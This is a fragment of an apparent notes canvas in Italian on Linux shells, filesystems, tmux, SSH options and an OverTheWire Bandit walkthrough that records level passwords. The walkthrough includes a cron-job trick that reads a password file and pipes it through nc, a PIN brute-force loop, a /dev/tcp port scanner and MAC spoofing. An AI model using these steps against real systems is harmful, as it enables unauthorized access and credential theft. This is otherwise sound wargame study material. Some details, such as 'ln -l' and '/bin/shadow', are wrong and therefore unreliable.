tre (`22`, `23` e `24`), gli owner sono i corrispondenti user ma il gruppo (con permesso di eseguire, ovviamente) è sempre l'user precedente (`21`, `22`, `23`). Il `22` scrive la password su un file nella cartella `/tmp/`, nella quale non posso fare `ls` ma posso fare `cat` col nome esatto del file.\n```\ntRae0UfB9v0UzbCdn9cY0gQnds9GF58Q\n```\n\n","x":10321,"y":4811,"width":759,"height":857,"color":"4"},
		{"id":"cf399d2a268fa327","type":"text","text":"# `(non-)login shell`, `/etc/profile` e `.bashrc`\n\nNon tutte le `shell` sono uguali. In particolare distinguiamo tra:\n\n- `login shell` - Quando accedo ad un sistema tramite autenticazione (e.g. `TTY` con una combinazione tipo `ctrl+alt+F6`, `SSH`, ma anche `sudo -i`). L'esecuzione di `echo $0` (i.e. la variabile in cui è salvato il nome dell'eseguibile) restituisce una cosa tipo `-bash` (con il trattino davanti);\n- `non-login shell` - Quando apro un terminale all'interno di un ambiente in cui sono già loggato (e.g. `ctrl+alt+T`, esecuzione di uno `script .sh`). Qui `echo $0` restituisce semplicemente `bash` (o simili).\n\nPer essere sicuri della differenza meglio ancora usare\n```bash\nshopt -q login_shell && echo \"Login shell\" || echo \"Non-login shell\"\n```\nBene, che ci faccio con questa differenza?\n\nQuando usi una `shell` esiste una configurazione predefinita che definisce variabili d'ambiente, alias, auto-completamenti (i.e. `tab`), funzioni ad hoc e simili. In ordine abbiamo\n\n- `/etc/profile` - Il primo file letto dal sistema quando apri una ***`login shell`***. Definisce cose tipo `PS1` (i.e. quello che ti esce scritto a sinistra dell'input del terminale, e.g. `user@server:path$ `) e tutto quello che abbiamo citato prima. Spesso queste direttive non sono scritte qui, ma c'è un riferimento ai file `~/.bash_profile`, `~/.bash_login` o `~/.profile` (viene letto solo il primo che viene trovato, in quest'ordine). Di solito c'è solo `~/.bash_profile`, che spesso chiama `~/.bashrc`;\n\t- Nota che essendo in `/etc` questo file è comune a tutti gli utenti;\n\t- Tra le altre cose, qui definisco standard come `PS1='#'` se l'utente è `root` e `PS1='$'` se l'utente è un comune mortale (lo scrivo solo perché vedere `#` può portare a pensare di avere massimi privilegi, ma è solo una convenzione, oltretutto modificabile!);\n- `~/.bash_profile` - Il riferimento per le `login shell` interattive;\n- `~/.bashrc` - Il riferimento per le `non-login shell` interattive. In pratica, per definire il tuo terminale su misura (colori, funzioni, alias e simili) modifica questo file.\n","x":9312,"y":5900,"width":759,"height":951,"color":"4"},
		{"id":"6c77a8fcb07b6f8a","type":"text","text":"# `tmux`\n\nComando che nasce per ***creare ambienti CLI virtuali indipendenti*** dalla `shell` aperta in `SSH`. Tradotto, se si interrompe la connessione non perdi il lavoro, perché questo non è più legato alla sessione `SSH` ma ad un ambiente virtuale sul server remoto. Il che è un po' come aprire `non-login shell` secondarie dopo esserti autenticato sulla `login shell`.\n\nTutto inizia definendo una nuova ***sessione virtuale*** con `tmux new -s nome_sessione`. Siamo dentro! E anzitutto usciamo con `tmux detach` (oppure `ctrl+b+d`, `tmux` ha un sacco di shortcut che usano `ctrl+b` al posto di `ctrl`), tornando alla `login shell` di `SSH`. Per vedere le sessioni attive `tmux ls`, per entrare in una di esse `tmux attach` (se ce ne sono diverse queste verranno numerate e dovrò aggiungere `-t #sessione`). Posso anche creare una nuova sessione e fare subito `attach` mettendo come opzioni `-As`. Rientriamo.\n\nA questo punto siamo pronti a gestire un simpatico ***sistema gerarchico*** di `shell`.\n\n- Ogni sessione può avere diverse ***finestre***, esattamente come in una GUI puoi avere diversi desktop. Puoi crearne una con `tmux new-window` (o `ctrl+b+c`), e ti sposti tra le varie finestre con `tmux next(previous)-window` (`ctrl+b+n(p)`) o con `tmux select-window -t N` (dove `N` è il numero della finestra che compare sotto, o `ctrl+b+[0-9]`). Per chiudere la finestra corrente, `tmux kill-window` (o `ctrl+b+x`);\n- Ogni finestra può essere splittata in diversi ***pannelli***. Lo split può avvenire sia in ***orizzontale*** o ***verticale*** (`tmux split-window -v(h)` o `ctrl+b+\"(%)`). Si passa tra pannelli con `tmux select pane -t :. +` o `ctrl+b+o`. Il pannello corrente viene chiuso con `tmux kill-pane`.\n\nA onor di cronaca, la maggior parte di queste shortcut non mi funzionano sulla connessione con `bandit`, non so perché. A seconda della versione potrei avere shortcut diverse. Si visualizzano con `tmux list-keys` (magari seguito da `| grep '^bind-key'`) e si possono settare nel file `~/.tmux.conf`.","x":10321,"y":5900,"width":759,"height":951,"color":"4"},
		{"id":"919974eda6aa094d","type":"text","text":"# Quali configurazioni?\n\ncosa posso configurare?\n\nAl crescere del numero di configurazioni posso rendere il tutto modulare:\n\nin profile c'è\n\n```bash\n# ~/.bash_profile tipico\nif [ -f ~/.bashrc ]; then\n  source ~/.bashrc\nfi\n```\n\nanalogamente in bashrc posso avere\n\n```bash\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n```\n\ncioè eseguo modularmente il file con gli alias senza scriverli tutti in bashrc e addirittura\n\n```bash\n# In .bashrc\nfor file in ~/.bashrc.d/*.sh; do\n  [ -r \"$file\" ] && source \"$file\"\ndone\n```\n\ni.e. sfrutto la directory bashrc.d per metterci tutti i file con le configurazioni, che gestisco in modo modulare","x":9312,"y":7086,"width":759,"height":951},
		{"id":"d1dcc5b0c954d3e1","type":"text","text":"# `shopt`\n\n","x":10326,"y":7086,"width":759,"height":951},
		{"id":"4cdb54104041d495","type":"text","text":"### 🔧 **1. `myip()` – Mostra IP pubblico e locale in modo leggibile**\n\n```bash\nmyip() {\n  echo \"🌐 Public IP:\"\n  curl -s ifconfig.me\n  echo -e \"\\n📡 Local IPs:\"\n  ip a | grep inet | grep -v 127.0.0.1 | awk '{print $2}'\n}\n```\n\n> _🧠 ti fa toccare con mano il concetto di IP pubblico/privato, e parsing dell’output_\n\n---\n\n### 🧠 **2. `extract()` – Estrazione intelligente di archivi**\n\n```bash\nextract () {\n  if [ -f \"$1\" ]; then\n    case \"$1\" in\n      *.tar.bz2)   tar xjf \"$1\"   ;;\n      *.tar.gz)    tar xzf \"$1\"   ;;\n      *.bz2)       bunzip2 \"$1\"   ;;\n      *.rar)       unrar x \"$1\"   ;;\n      *.gz)        gunzip \"$1\"    ;;\n      *.tar)       tar xf \"$1\"    ;;\n      *.tbz2)      tar xjf \"$1\"   ;;\n      *.tgz)       tar xzf \"$1\"   ;;\n      *.zip)       unzip \"$1\"     ;;\n      *.Z)         uncompress \"$1\";;\n      *.7z)        7z x \"$1\"      ;;\n      *)           echo \"'$1' non è un archivio conosciuto.\" ;;\n    esac\n  else\n    echo \"'$1' non è un file valido.\"\n  fi\n}\n```\n\n---\n\n### 🔍 **3. `portscan()` – Scansione veloce di porte TCP su un host**\n\n```bash\nportscan() {\n  host=$1\n  echo \"Scanning $host...\"\n  for port in {20..1024}; do\n    timeout 0.5 bash -c \"echo >/dev/tcp/$host/$port\" 2>/dev/null && echo \"🟢 Port $port open\"\n  done\n}\n```\n\n> _🧠 Ti fa scoprire che `bash` implementa le socket TCP con `/dev/tcp` (mica poco). Insegna timeout, redirection, e un uso utile dei for-loop._\n\n---\n\n### 🔄 **4. `myps()` – Visualizza processi in modo leggibile e filtrabile**\n\n```bash\nmyps() {\n  ps aux | grep -i \"${1:-.}\" | grep -v grep | awk '{printf \"%-10s %-6s %-6s %-40s\\n\", $1, $2, $3, $11}'\n}\n```\n\n> _🧠 per esplorare cosa sta girando nel tuo sistema, e anche qui impari regex, piping, `awk`._\n\n---\n\n### 📂 **5. `clocdir()` – Conta righe di codice in una directory**\n\n```bash\nclocdir() {\n  find . -type f -name \"$1\" | xargs wc -l\n}\n```\n\nEsempio: `clocdir \"*.py\"`\n\n> _🧠 Ti fa ragionare su `find`, globbing, `xargs`, e comandi da CLI per esplorare codice._\n\n---\n\n### 🧰 **6. `serve()` – Avvia un server HTTP sulla directory corrente**\n\n```bash\nserve() {\n  python3 -m http.server \"${1:-8000}\"\n}\n```\n\n> _🧠 Utilissimo per testare HTML/CSS, ma anche per capire come funziona una richiesta HTTP GET basic._\n\n---\n\n### 📋 **7. `hashsum()` – Calcola hash MD5/SHA di un file**\n\n```bash\nhashsum() {\n  echo \"MD5:    $(md5sum \"$1\" | cut -d' ' -f1)\"\n  echo \"SHA1:   $(sha1sum \"$1\" | cut -d' ' -f1)\"\n  echo \"SHA256: $(sha256sum \"$1\" | cut -d' ' -f1)\"\n}\n```\n\n> _🧠 Collegamento diretto a crittografia, checksum e hash fingerprinting._\n\n---\n\n### 🚀 **8. `upt()` – Riepilogo system info (uptime, CPU, RAM)**\n\n```bash\nupt() {\n  echo \"🖥️ Hostname: $(hostname)\"\n  echo \"⏱️ Uptime: $(uptime -p)\"\n  echo \"🧠 RAM:\"\n  free -h\n  echo \"⚙️ CPU Load:\"\n  uptime | awk -F'load average:' '{print $2}'\n}\n```\n\n---\n\n### 🎲 **9. `randmac()` – Genera un MAC address casuale**\n\n```bash\nrandmac() {\n  hexchars=\"0123456789ABCDEF\"\n  echo -n \"02\"\n  for i in {1..5}; do echo -n \":${hexchars:$((RANDOM % 16)):1}${hexchars:$((RANDOM % 16)):1}\"; done\n  echo\n}\n```\n\n> _🧠 Generare MAC è utile anche per anonimato su reti pubbliche (spoofing MAC). Ti fa toccare shell math e slicing._\n\n---\n\n### 🧩 **10. `whoowns()` – Mostra a chi appartiene un file**\n\n```bash\nwhoowns() {\n  stat --format 'File: %n\\nUser: %U (%u)\\nGroup: %G (%g)' \"$1\"\n}\n```\n\n---\n\n## Vuoi portarla al livello successivo?\n\nSe queste ti piacciono, possiamo:\n\n- Scriverle in file `.bash_functions` da includere con `source` in `.bashrc`\n    \n- Aggiungere completamento automatico\n    \n- Collegarle a `fzf` per esplorazione file/processi\n    \n- Creare delle variabili globali custom (e.g. `PROJDIR`, `MYTMP`, `SNIPPETS`)\n    \n- Costruire alias avanzati che ti portano in cartelle, compilano, lanciano test, ecc.\n    \n\n---\n\nFammi sapere quali vuoi implementare per primi, oppure ti preparo direttamente un pacchetto base da cui partire.","x":9312,"y":8282,"width":759,"height":951},
		{"id":"11f1e298bd1b5794","type":"text","text":"### Cosa fa `shopt`?\n\n`shopt` (che sta per \"shell options\") ti permette di **visualizzare e modificare varie opzioni del comportamento della shell Bash**. Queste opzioni controllano aspetti diversi, dalla gestione della cronologia dei comandi, al modo in cui la shell completa i nomi dei file, fino a come gestisce gli errori o i caratteri speciali nei nomi dei file.\n\nIn pratica, `shopt` ti dà un controllo granulare su come Bash opera e interagisce con te.\n\n### Come si usa?\n\nEcco i modi principali per usarlo:\n\n- **`shopt`**: Se lo esegui senza argomenti, `shopt` ti mostrerà tutte le opzioni della shell, indicando per ciascuna se è **on** (abilitata) o **off** (disabilitata).\n    \n- **`shopt -s [opzione]`**: Questo comando **abilita** l'opzione specificata. `-s` sta per \"set\".\n    \n- **`shopt -u [opzione]`**: Questo comando **disabilita** l'opzione specificata. `-u` sta per \"unset\".\n    \n- **`shopt -p [opzione]`**: Questo comando stampa l'opzione specificata in un formato che puoi usare direttamente in uno script o nel tuo file `.bashrc` per impostarla. Ad esempio, `shopt -p cdspell` stamperà `shopt -s cdspell` se l'opzione è abilitata, o `shopt -u cdspell` se è disabilitata.\n    \n- **`shopt -o`**: Questo ti mostra le opzioni che possono essere impostate anche con il comando `set -o`. C'è una certa sovrapposizione tra `shopt` e `set -o`, ma `shopt` generalmente offre più opzioni specifiche di Bash.\n    \n\n---\n\n### Alcuni esempi di opzioni utili:\n\nVediamo alcune delle opzioni più comuni e utili che puoi controllare con `shopt`:\n\n- **`cdspell`**:\n    \n    - Quando abilitata (`shopt -s cdspell`), se commetti un piccolo errore di battitura nel nome di una directory mentre usi `cd`, Bash proverà a correggerlo automaticamente e a spostarti nella directory corretta.\n        \n    - Esempio: Se scrivi `cd /homw` invece di `cd /home`, Bash potrebbe comunque portarti in `/home`.\n        \n- **`autocd`**:\n    \n    - Quando abilitata (`shopt -s autocd`), se digiti il nome di una directory (senza il comando `cd` davanti) e quella directory esiste, Bash ti ci sposterà automaticamente.\n        \n    - Esempio: Scrivi `/usr/local/bin` e premi Invio, Bash farà un `cd /usr/local/bin`.\n        \n- **`dotglob`**:\n    \n    - Quando abilitata (`shopt -s dotglob`), i caratteri jolly (come `*` o `?`) includeranno anche i file e le directory che iniziano con un punto (`.`), che normalmente sono nascosti (ad esempio, `.bashrc`).\n        \n    - Esempio: `ls *` mostrerà anche i file nascosti se `dotglob` è attivo.\n        \n- **`extglob`**:\n    \n    - Quando abilitata (`shopt -s extglob`), abilita funzionalità di espansione dei nomi di file estese, come `!(file)` (tutto tranne \"file\") o `@(file1|file2)` (file1 o file2). Utile per pattern matching più complessi.\n        \n- **`histappend`**:\n    \n    - Quando abilitata (`shopt -s histappend`), i nuovi comandi che esegui vengono **aggiunti** al file della cronologia (`~/.bash_history`) invece di sovrascriverlo ogni volta che esci dalla shell. Questo è quasi sempre desiderabile per mantenere una cronologia completa.\n        \n- **`cmdhist`**:\n    \n    - Quando abilitata (`shopt -s cmdhist`), i comandi multilinea (ad esempio, quelli con un `\\` per continuare su una nuova riga) vengono salvati come una singola voce nella cronologia, rendendola più pulita.\n        \n\n---\n\n### Dove impostare le opzioni `shopt`?\n\nSe vuoi che le modifiche apportate con `shopt -s` o `shopt -u` siano permanenti e si applichino ogni volta che apri una nuova shell, devi inserirle nel tuo file di configurazione di Bash, di solito **`~/.bashrc`**.\n\nIn sintesi, `shopt` è un comando chiave per chiunque voglia spingere un po' più in là la personalizzazione e l'efficienza della propria esperienza con Bash. È un modo per dire a Bash esattamente come vuoi che si comporti in diverse situazioni.\n\nHai qualche opzione specifica su cui vorresti sapere di più?","x":11257,"y":6882,"width":1088,"height":1630},
		{"id":"fdbc07a0c20b462e","type":"text","text":"# Level 22, 23\n\n22. Sappiamo dal livello precedente di dover fare `cat /usr/bin/cronjob_bandit23.sh`, nel quale troviamo uno scriptino dal quale è intuitivo capire come ottenere\n\n```\n0Zf11ioIjMVN551jX3CmStKLYqjk54Ga\n```\n\n- Nello specifico prende una stringa con il nome utente che esegue lo script tramite il comando `whoami`, lo da in pasto ad una funzione di hash (`md5sum`) e infine prende solo il primo valore (senza lo spazio che segue) con `cut -d ' ' -f 1`. Nota che `MD5` non viene più usato in ambito sicurezza (meglio cose come `sha256sum` o `openssl dgst`).\n\n23. Questo ultimo `cronjob` esegue con i permessi utente di `bandit24` tutti i file nella cartella `/var/spool/bandit24/foo/` che abbiano come owner `bandit23`. Tradotto, mi sta suggerendo di scrivere uno script in quella cartella in modo che sia eseguito con i permessi di `bandit24`: `echo -e \"#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > ...?`. Cioè, su quale output stampo? Potrei trovare le cartelle del sistema in cui posso accedere e scrivere (cfr. ***Esempi Avanzati di `find`***), ma trovo più istruttivo trovare il modo di leggerlo sulla `shell` su cui sono loggato. Eseguendo `tty` scopriamo di chiamarci `/dev/pts/11`, quindi lo scegliamo come output e aspettiamo. E invece non possiamo farlo, perché l'utente `bandit24` non vede i miei processi. Proviamo con `nc`.\n- edit: sono un imbecille. Continuava a non funzionare un cazzo perché non facevo mai `chmod +x`. Grazie. Per la cronaca, forse è vero che col primo metodo non si può fare perché `bandit24` non vede i miei processi, ma con `cat /etc/bandit_pass/bandit24 | nc localhost 1234` + ovviamente il server in ascolto `nc -nvlp 1234` sull'altra finestra del comodissimo `tmux` trovo\n\n```\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8\n```","x":11330,"y":4811,"width":759,"height":857,"color":"4"},
		{"id":"3211cceb0b4760d0","type":"text","text":"# SPACING","x":12089,"y":4811,"width":250,"height":235,"color":"5"},
		{"id":"69a9de5e0c6960b7","type":"text","text":"# Level 24, 25\n\n24. Realizziamo il bruteforce con un ciclo `for i in {0000..9999}; do echo \"gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i\"; done | nc localhost 30002` ottenendo\n```\niCi86ttT4KSNe1armKiwbQNmB3YJP3q4\n```\n- Poi mi stavo ponendo il problema di filtrare l'output, ma non è servito. In caso esistono comandi da abbinare a `grep` quando l'output è strano (e.g. `unbuffer`).\n25. Dal file `/etc/passwd` troviamo che l'user `bandit26` usa `/usr/bin/showtext` come `shell` predefinita, il che è un po' stupido, perché dentro c'è scritto\n```sh\n#!/bin/sh\nexport TERM=linux\nexec more ~/text.txt\nexit 0\n```\n\n","x":12339,"y":4811,"width":759,"height":857},
		{"id":"2e45d1f9862fc4b4","type":"text","text":"\n## **💣 6. Montaggio e Manipolazione del Filesystem**\n\n### **🛠 Montare un Filesystem**\n\nPuoi montare manualmente una partizione per esplorare i suoi file.\n\n```bash\nmount /dev/sdb1 /mnt\ncd /mnt\n```\n\nPer smontare:\n\n```bash\numount /mnt\n```\n\n💡 **Hacker Tip:**\n\n- Se trovi un disco sospetto, puoi montarlo e analizzarne il contenuto.\n- `mount -o loop file.iso /mnt` → Monta un file `.iso` come fosse una partizione.","x":3257,"y":842,"width":759,"height":510},
		{"id":"1e4bdb54f9ff41bb","type":"text","text":"# Montare un `filesystem`\n\nMa come fa il SO a montare un `filesystem`? C'è una `syscall` apposta: `mount()`. E che fa?\n\nPrendiamo questo esempio: quando inserisco una `USB`, il kernel ha un modulo che se ne accorge, legge i metadati e se si tratta di un `filesystem` leggibile lo mette in `/dev/sd*` (e.g. `/dev/sda`, che è l'intero file a blocchi, mentre i vari `sda1`, `sda2` sono le singole partizioni). Questo chiaramente non è un punto di accesso ai dati, ma solo un `hey, qui c'è una roba`. Per leggerlo devo capire come interpretarlo, i.e. leggere il `superblock`. Il comando `sudo mount /dev/sda1 /mnt/usb` fa esattamente questo, aggiungendo l'`inode /mnt/usb` come punto di accesso. È quindi in grado di mappare gli `inodes` fisici in `inodes` virtuali, creando contestualmente un numero univoco di `Device`.\n\nOvviamente tutto questo vale anche nel caso in cui sia il SO stesso a creare un `filesystem` virtuale, con l'eccezione che non va mappato nulla (piuttosto, va solo aggiunto un accesso).\n\nPosso visualizzare l'elenco dei `filesystem` montati con `mount | column -t` (o `findmnt`, che fa l'albero). Sarà facile notare che la stragrande maggioranza di essi sono virtuali (quelli fisici hanno spesso `SOURCE /dev/qualcosa`), che ci stanno un botto di tipi di formattazione (`FSTYPE`) e che i punti di mount sono anche altrove (non solo in `/`!).\n\nViceversa, la \"rimozione sicura dell'HW\" fa un `unmount`, i.e. scollega il `filesystem` in modo \"dolce\" per evitare che il SO esegua ancora operazioni mentre rimuovo la chiavetta fisica.","x":3257,"y":1539,"width":759,"height":759,"color":"4"},
		{"id":"9d6e1bc42fdc8fff","type":"text","text":"# Risultato - `root directory /`\n\nMentre in Windows ogni unità (disco) ha la propria lettera (e.g. `C:\\`), Linux costruisce una ***root directory*** `/` da cui si evolve tutto il contenuto del sistema. Se faccio `ls` vi trovo\n\n- `bin@` - Contiene eseguibili di base per il terminale (e.g. `ls`, `cp`, `cat`);\n\t- Oddio, ma non è una directory! Già non lo è. In principio qui c'era `/bin`, ma versioni più recenti del SW hanno spostato questa cartella in `/usr/bin`. Questo è pertanto un ***symlink*** alla sua versione più recente. E che significa? Posso ancora usare il path `/bin`, il sistema leggerà direttamente gli ***inodes*** di `/usr/bin`;\n\t- Discorso simile per `sbin@`, che contiene gli eseguibili di sistema (e.g. `iptables`);\n- `lib*@` - Ne troviamo diverse versioni, sono librerie di supporto ai vari SW;\n\t- `lib@` contiene quelle per `bin` ed `sbin`;\n\t- `lib32@` e `libx32@` supportano i SW a `32 bit`, `lib64@` quelli a `64 bit`.\n- `boot` - I file di avvio del sistema;\n\t- `vmlinuz` - Di fatto è il ***kernel***. `z` indica una compressione: essendo molto pesante, viene decompresso solo in RAM;\n\t- `initramfs` - All'avvio, il kernel viene caricato in RAM. Per leggere i formati di tipo `filesystem` (e.g. `ext4`) e montare `/` ha però bisogno di altri strumenti, forniti appunto da `initramfs`. Finito questo, il kernel carica il SO da `/sbin/init`.\n- `dev` - `filesystem` virtuale per rappresentare i vari HW collegati;\n- `etc` - Configurazioni di sistema (e.g. `/etc/passwd`, `/etc/hosts` per il DNS locale);\n- `home` - I dati personali degli utenti;\n- `lost+found` - File recuperati dopo un crash. Praticamente inaccessibile;\n- `media` - Punto di mount automatico per HW esterno (e.g. `USB`) ma anche per GUI come `GNOME` e `KDE`. Ci starebbe anche `cdrom`, specifico per i CD, ma ovviamente è in disuso;\n- `mnt` - Punto di mount manuale per `filesystems`;\n- `opt` - SW installato manualmente dall'utente (e.g. Chrome su Ubuntu);\n- `proc` - `filesystem` virtuale contenente informazioni sul sistema (e.g. `/proc/cpuinfo`);\n- `root` - `Home directory` per l'utente `root`;\n- `run` - Dati temporanei di `runtime` (e.g. `PID`, `Socket`);\n- `snap` - SW installato con `snap`;\n- `srv` - Qui dentro c'è qualcosa solo se la macchina offre servizi da server;\n- `swapfile` - Memoria virtuale;\n- `sys` - `filesystem` virtuale per le informazioni sull'HW;\n- `usr` - Programmi installati dal sistema (e.g. SW e librerie non essenziali);\n- `var` - Dati variabili (e.g. `log`, pool di stampa);\n- `tmp` - Dati temporanei, azzerati al riavvio del sistema.","x":5275,"y":331,"width":759,"height":1021,"color":"4"},
		{"id":"9353a581758bae87","type":"text","text":"# Hard and Soft (... links)\n\nAbbiamo capito che in Linux ogni file corrisponde ad un `inode`, che contiene informazioni su permessi, proprietari, timestamp e puntatori ai blocchi di dati di memoria. Nota che un `inode` non contiene il nome del file: diversi nomi possono puntare allo stesso `inode`.\n\n- Un ***hard link*** genera un ***alias*** che punta allo stesso `inode`. Posso crearne uno con il comando `ln originale.txt copia.txt`, ed entrambi avranno lo stesso numero di `inode`. Questo significa che anche eseguendo `rm originale.txt` l'`inode` resta raggiungibile da `copia.txt`;\n\t- Questa cosa si può fare solo entro lo stesso `filesystem`. Il motivo è chiaro: ogni `filesystem` ha il suo set di `inodes`, che sono univoci solo entro quel `filesystem` stesso. L'`inode 10` di `/etc` e l'`inode 10` di `/proc` puntano a cose diverse! );\n\t- La memoria viene liberata solo quando tutti gli hard link a quell'`inode` vengono rimossi. `find / -inum 123456` trova tutti i file che puntano all'`inode 123456`;\n\t- Usato per creare ***più punti di accesso ad un file*** senza duplicarlo, mantenendo ogni link funzionante anche se un altro viene rinominato o spostato.\n- Un ***soft link*** (***symlink***) genera un link al ***path*** di un altro file. Posso crearne uno con il comando `ln -l /originale.txt /home/user/desktop/symlink.txt`. Il file su `desktop` farà riferimento al `path /originale.txt`, e da lì troverà il giusto `inode`.\n\t- `symlink.txt` non ha lo stesso `inode` di `originale.txt`. Questo permette ad un `soft link` di creare collegamenti tra `filesystems` diversi;\n\t- Se il file `originale.txt` viene eliminato, `symlink.txt` diventa un ***dangling link***, i.e. un ***link rotto***. Posso trovare tutti i link rotti nel sistema con `find / -xtype l`;\n\t- Usato per creare ***shortcut*** ed organizzare le cartelle in modo dinamico.","x":5275,"y":1539,"width":759,"height":760,"color":"4"},
		{"id":"725abded725d4498","type":"text","text":"# Dischi Fisici e Partizioni - `df`, `lsblk`, `blkid`\n\nGli `inodes` non corrispondono allo spazio su disco. Un file è associato sempre ad un solo `inode`, indipendentemente dal suo peso (può essere `50 byte` come `10 Gb`).\n\n- Il comando `df` (`disk free`) mostra lo spazio su disco e gli `inodes` per i soli `filesystems` fisici, includendo il loro punto di montaggio. Come opzioni principali abbiamo `-h` (human-readable), `-i` (mostra gli `inodes` invece dello spazio) e `-T` (mostra la formattazione, e.g. `ext4`);\n- `lsblk` mostra tutti i `filesystems` riconosciuti dal SO, anche quelli non montati (per vedere solo quelli montati, `findmnt`);\n- `blkid` restituisce le informazioni su disco e partizione su cui ti trovi.","x":4266,"y":1010,"width":759,"height":342,"color":"4"},
		{"id":"db8524057030a7aa","type":"text","text":"# Linux `filesystem`\n\nPartiamo col dire questo: un SO può tranquillamente ***simulare*** un `filesystem`. Perché mai dovrebbe volerlo fare? In realtà è semplice. Il fatto stesso che il SO sia in esecuzione implica che ci sono dei processi che stanno girando. Quali? Basta andare su `/proc`, no? \n\nBene, `/proc` è un `filesystem` simulato. Questo perché i processi nascono all'avvio del SO, non avrebbe molto senso scrivere su disco una cosa che va continuamente cancellata ad ogni riavvio del sistema. La soluzione quindi è lasciarli solo su RAM, ma è utile sapere quale processo ha generato quale. L'albero dei processi è un `filesystem`... virtuale. Nonostante non sia questo che avviene, avrebbe senso far coincidere gli `inodes` di questo albero con i `PID` dei vari processi, dove giustamente il processo con `PID 1` corrisponde all'`inode 1`.\n\nA rigore ci sarebbe da dire che gli `inodes` sono una mappatura dei dati su disco, e sono propri dei `filesystems` fisici. Un `filesystem` simulato non avrebbe bisogno di `inodes`, ma il SO li genera lo stesso per uniformità e compatibilità. La differenza però la si può vedere eseguendo prima `findmnt` (mostra tutti i `filesystems` montati), e poi `df -i` (mostra solo gli `inodes` realmente esistenti, perché legge i dischi fisici).\n\nOra, capiamo bene che se `/proc` è un `filesystem` a sé stante (`procfs`) con un proprio `inode 1`... ma `/proc` è solo una delle `directories` di `/`... Qual è il punto?\n\n***Linux crea il proprio `filesystem` complessivo montando diversi `filesystems`***, sia fisici che virtuali. Questo significa anche però che ognuno di essi avrà i propri `inodes`, e in particolare ognuno di essi avrà il proprio `inode 1` da cui parte tutto. È per questo che facendo `l -i /` troviamo diversi oggetti con `inode 1`. Come fa il SO a distinguerli? \n\nEseguendo `stat /sys` notiamo una voce `Device = 17h/23d` (formato `hex/decimale`), mentre con `stat /proc` troviamo `Device = 18h/24d`, nonostante abbiano entrambi `inode = 1`. In pratica, assegnando numeri di `Device` univoci ad ogni `filesystem` che monta, la nuova \"chiave primaria\" per identificare gli elementi nel sistema diventa `(Device, inode)`.\n","x":4266,"y":1540,"width":759,"height":759,"color":"6"},
		{"id":"8603be4ae948e472","type":"text","text":"# Opzioni Furbe\n\nLe `[options]` di `ssh` sono in realtà uno strumento molto potente.\n\n- `-N -f -q -L` - ha senso usarli insieme: `-N` apre una connessione senza terminale, e uno si potrebbe chiedere \"ma allora a che serve?\". Ecco perché parliamo anche di `-L`, che fa ***port forwarding*** dalle mie porte locali a quelle dell'host remoto. Cioè?\n\t- `-L <porta_locale>:<host_remoto>:<porta_remota>` si comporta così: quando arriva un qualcosa alla mia `porta_locale`, questo qualcosa viene reindirizzato direttamente alla `porta_remota` dell'`host_remoto`;\n\t\t- Nota che `host_remoto` potrebbe non essere l'`host` con cui ho stabilito la connessione `ssh`! Con `ssh -L 3306:192.168.1.50:4070 user@host` sto dicendo \"`Ciao host, mo' io ti mando qualsiasi cosa arrivi sulla mia porta 3306, tu devi girare tutto a 192.168.1.50:4070 (dal tuo punto di vista, i.e. come se fossi tu a mandarla). Come? Boh, veditela tu`\";\n\t\t- Di norma sta roba si usa per accedere ad un qualche servizio dal punto di vista di `host`, quindi scrivendo `ssh -L 3306:localhost:3307 user@host`. In pratica così sto dicendo una roba del tipo `Devi fare una roba per me, ti inoltro tutto ciò che passa sulla mia porta 3306 alla tua porta 3307` (***`localhost`*** è un placeholder per l'indirizzo di ***loopback*** `127.0.0.1`);\n\t- `-N` evita di aprire il terminale, quindi fa consumare meno risorse all'`host`, mentre `-f` mette il processo in ***background***;\n\t\t- Uno potrebbe pensare che così si guadagna in privacy, ma non è vero. Il processo resta visibile ad un comando `ps aux`, anche se si può provare a limitare la quantità di log registrati tramite la ***quiet mode*** (`-q`).\n\t- `-L` ha anche l'opzione inversa: `-R a:localhost:b` significa che tutto ciò che arriva all'`host` sulla porta remota `a` viene mandato alla mia macchina sulla porta `b`.\n- `-D` - Configura un ***proxy SOCKS***, i.e. un proxy che opera a livello di trasporto. Questo gli permette di inoltrare dati senza fare le solite porcate che fanno i proxy `HTTP` (e.g. filtrare il traffico, o spiarlo), nonché di inoltrare qualsiasi tipo di richiesta. `ssh -D 8080 user@host` sta dicendo ad `host` che quando arrivano richieste sulla porta `8080` lui deve mandarle nel tunnel (cfr. ***SOCKS Proxy***, moooolto più in basso).","x":230,"y":2532,"width":759,"height":848,"color":"4"},
		{"id":"eab759960ddcf808","type":"text","text":"# Attaccare SSH\n\nPartiamo da un presupposto: se il server è configurato bene, è tendenzialmente difficile.\n\nNelle opzioni di configurazione, `sshd_config` può prevedere un numero massimo di tentativi da un certo `IP` (`MaxAuthTries`), oltre il quale un sistema come `fail2ban` può bannare il tuo `IP` (i.e. non accettare più alcun tentativo da parte tua).\n\nQuesto chiaramente presuppone che tu stia facendo brute force su una password debole. È però possibile che l'`host` accetti solo autenticazione con chiavi asimmetriche, rendendo di fatto qualsiasi attacco impossibile (a meno che non fai tipo MitM al momento dello scambio di chiavi, ma stiamo parlando di cose complicate).\n\nSe sei già dentro al sistema, potresti voler trovare le `password` di altri `user`. Questo si riduce a un meccanismo di hacking interno alla macchina, per cui dovresti avere i permessi per accedere a `/bin/shadow` e usare un tool come `hashcat` o `john` per risalire ai dati a partire dagli hash (cosa notoriamente difficile).","x":-779,"y":2744,"width":759,"height":439,"color":"4"},
